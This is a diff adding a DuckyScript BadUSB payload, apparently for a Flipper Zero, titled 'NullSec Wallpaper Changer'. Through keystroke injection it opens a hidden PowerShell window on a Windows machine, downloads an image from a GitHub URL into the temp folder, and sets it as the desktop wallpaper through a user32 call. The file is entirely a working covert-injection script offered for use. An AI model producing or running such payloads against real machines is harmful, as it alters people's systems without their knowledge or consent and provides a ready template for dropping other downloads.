@@ -1,0 +1,28 @@
+REM NullSec Wallpaper Changer
+REM Changes desktop wallpaper
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+STRING $url = "https://raw.githubusercontent.com/bad-antics/nullsec-flipper-suite/main/assets/wallpaper.png"
+ENTER
+STRING $path = "$env:TEMP\nullsec.png"
+ENTER
+STRING Invoke-WebRequest -Uri $url -OutFile $path
+ENTER
+STRING Add-Type -TypeDefinition @"
+ENTER
+STRING using System.Runtime.InteropServices;
+ENTER
+STRING public class Wallpaper { [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }
+ENTER
+STRING "@
+ENTER
+STRING [Wallpaper]::SystemParametersInfo(0x0014, 0, $path, 0x01 -bor 0x02)
+ENTER
+STRING exit
+ENTER
